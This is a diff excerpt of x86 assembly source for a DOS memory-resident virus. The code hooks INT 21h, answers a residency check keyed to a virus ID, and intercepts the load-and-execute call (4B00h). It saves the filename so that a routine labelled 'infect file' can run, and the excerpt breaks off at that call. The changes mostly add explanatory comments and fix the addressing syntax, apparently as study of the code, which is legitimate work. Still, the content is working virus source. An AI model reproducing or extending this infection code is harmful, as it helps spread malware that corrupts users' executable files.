@@ -49,10 +49,11 @@ cmp ax, nVirusID ;routine to check residency of virus?
 jne NOT_VIRUS_CHECK
 popf ;because we pushed the flags before comparing
 xchg ax, bx ;tell calling program that we're resident --> exchange data ax and bx
-iret ;return, since we don't have to call old ISR
+iret ;return, since we don't have to call old ISR --> Interrupt Return 
+;iret pops CS, the flags register, and the instruction pointer from the stack and resumes the routine that was interrupted.
 NOT_VIRUS_CHECK:
-cmp ax, 4B00h ;load and execute file? -->Loads a program into memory, creates a new program segment prefix
-; (PSP), and transfers control to the new program.
+cmp ax, 4B00h ;load and execute file? -->Function 4B00h =Load and Execute Program (EXEC) ,
+;Loads a program into memory, creates a new program segment prefix (PSP), and transfers control to the new program.
 je EXEC_FN
 popf ;because we pushed the flags before comparing
 ;JUMP TO OLD ISR 
@@ -63,11 +64,11 @@ dwOldExecISR DD ? ;old ISR address is stored here
 EXEC_FN:
 popf ;because we pushed the flags before comparing
 ;SAVE FILENAME ADDRESS 
-push bp
+push bp ;GetRelocation pop bp
 GetRelocation bp
-mov cs:bp+_DX_DS, dx ;DS:DX contains the filename. we must save
-mov cs:bp+_DX_DS+2, ds ;these, because they will be destroyed after
-pop bp ;the call to INT 21h
+mov word ptr[cs:bp+_DX_DS], dx ;DS:DX contains the filename. we must save
+mov word ptr[cs:bp+_DX_DS+2], ds ;these, because they will be destroyed after the call to INT 21h
+pop bp 
 ;CALL ROUTINE TO INFECT FILE 
 SaveRegisters ;we don't want to mess up, since this is an ISR
 push cs
